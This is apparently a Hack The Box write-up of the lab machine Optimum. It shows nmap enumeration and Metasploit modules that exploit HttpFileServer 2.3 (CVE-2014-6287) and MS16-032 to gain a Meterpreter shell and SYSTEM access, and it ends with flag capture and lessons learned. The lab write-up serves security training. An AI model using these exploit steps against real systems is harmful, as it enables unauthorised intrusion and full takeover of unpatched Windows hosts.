---
title: HTB Optimum Writeup
date: 2026-08-17 14:00:00 +0400
categories: [HTB, Easy]
tags: [rejetto-hfs, cve-2014-6287, ms16-032, privilege-escalation, windows]
---

# HTB Optimum — Writeup

**Machine**: Optimum | **OS**: Windows Server 2012 R2 | **Difficulty**: Easy | **IP**: 10.129.65.73

---

## Machine Information

- **Operating System**: Microsoft Windows Server 2012 R2 Standard
- **Build**: 9600
- **Domain**: HTB
- **Web Server**: HttpFileServer (HFS) 2.3

---

## Reconnaissance & Enumeration

### Nmap Scan

Started with a basic port scan:

```bash
nmap -sC -sV 10.129.65.73
```

**Open Ports:**
- **Port 80**: HttpFileServer (HFS) 2.3

**Key Findings:**
- Only one web service exposed
- HttpFileServer 2.3 is an old file server application
- Web-based attack is the primary vector

### Version Identification

Identified the service as **HttpFileServer 2.3**, an extremely outdated application released years ago.

### CVE Research

Googled for known vulnerabilities in HttpFileServer 2.3 and discovered:

CVE-2014-6287 — Remote Code Execution via null byte injection


Metasploit has a dedicated exploit module for this vulnerability.

---

## Exploitation

### Stage 1: Setting Up Metasploit

Located and used the Metasploit exploit module:

```bash
msfconsole
use windows/http/rejetto_hfs_exec
set RHOSTS 10.129.65.73
run
```

### Stage 2: Obtaining Initial Shell

Successfully executed the exploit:

[*] Meterpreter session 1 opened


Obtained initial Meterpreter shell and launched interactive command prompt:

```bash
shell
```

### Stage 3: Verifying Initial Access

Confirmed access as kostas user:

```bash
whoami
```

**Output:**

optimum\kostas


### Stage 4: System Information Gathering

Collected system details:

```bash
systeminfo
```

**Key Information:**

Host Name: OPTIMUM
OS Name: Microsoft Windows Server 2012 R2 Standard
OS Version: 6.3.9600
Build: 9600
Hotfix(s): 31 Hotfix(s) Installed


Despite 31 hotfixes installed, critical patches are missing.

---

## Privilege Escalation

### Stage 1: Identifying Vulnerability

Analyzed installed patches:

```bash
wmic qfe get HotFixID
```

Compared against known Windows Server 2012 R2 vulnerabilities and identified:

MS16-032 / CVE-2016-0099 — Secondary Logon Handle Privilege Escalation
Missing Patch: KB3139914


This vulnerability allows privilege escalation from any user to SYSTEM.

### Stage 2: Setting Up Local Exploit

Used Metasploit's local privilege escalation module:

```bash
use windows/local/ms16_032_secondary_logon_handle_privesc
```

### Stage 3: Executing Privilege Escalation

Executed the exploit from the Meterpreter session:

```bash
run
```

**Result:**

[+] Privilege escalation successful
[] New Meterpreter session 2 created
[] Process 1904 created
[*] Channel 1 created


### Stage 4: Verifying Root Access

Launched shell from elevated session:

```bash
shell
whoami
```

**Output:**

nt authority\system


**Success!** Achieved SYSTEM-level privileges — highest access on Windows.

---

## Post-Exploitation: Flag Capture

### User Flag

Retrieved user flag from kostas Desktop:

```bash
type C:\Users\kostas\Desktop\user.txt
```

### Root Flag

Retrieved root flag from Administrator Desktop:

```bash
type C:\Users\Administrator\Desktop\root.txt
```

---

## Summary & Key Takeaways

### Attack Chain

1. **Enumeration** → Identified HttpFileServer 2.3
2. **CVE Research** → Found CVE-2014-6287 with Metasploit module
3. **Remote Code Execution** → Exploited HFS null byte injection
4. **Initial Shell** → Obtained access as kostas user
5. **Patch Analysis** → Identified missing MS16-032 patch (KB3139914)
6. **Local Privilege Escalation** → Exploited Secondary Logon Handle vulnerability
7. **SYSTEM Access** → Achieved highest Windows privileges
8. **Flag Retrieval** → Captured both user and root flags

### Key Vulnerabilities

- **Outdated HFS Version** — HttpFileServer 2.3 with known RCE
- **Null Byte Injection** — CVE-2014-6287 in HFS file handling
- **Missing Patches** — MS16-032 patch (KB3139914) not installed despite 31 hotfixes
- **Secondary Logon Vulnerability** — CVE-2016-0099 allows privilege escalation
- **Single Service Exposure** — Only HFS running, making exploitation straightforward

### Critical Details

- **CVE-2014-6287** allows remote code execution through null byte injection in HttpFileServer
- **MS16-032 / CVE-2016-0099** is a critical privilege escalation vulnerability in Windows Server 2012 R2
- Despite having 31 hotfixes installed, critical security patches can still be missing
- Metasploit modules exist for both initial exploitation and privilege escalation

### Tools Used

- `nmap` — port scanning and service identification
- `msfconsole` — Metasploit framework
- `windows/http/rejetto_hfs_exec` — HFS RCE exploit
- `windows/local/ms16_032_secondary_logon_handle_privesc` — Local privilege escalation
- Standard Windows commands (whoami, systeminfo, type, wmic)

### Lessons Learned

- **Always Google CVE versions** — Outdated software versions often have public exploits
- **Metasploit is powerful** — Has modules for many known vulnerabilities
- **Patch analysis is critical** — Even with hotfixes installed, check for specific missing patches
- **Privilege escalation follows enumeration** — systeminfo and wmic qfe reveal escalation paths
- **Defense-in-depth** — Single missing patch can undermine all other security measures
- **Outdated services are critical risks** — HttpFileServer 2.3 should never be internet-facing
- **Secondary Logon vulnerabilities** — MS16-032 is a well-known Windows privesc vector

---

## Flags

- 🚩 **User Flag**: Captured from `C:\Users\kostas\Desktop\user.txt`
- 🚩 **Root Flag**: Captured from `C:\Users\Administrator\Desktop\root.txt`

**Machine: Completed ✓**
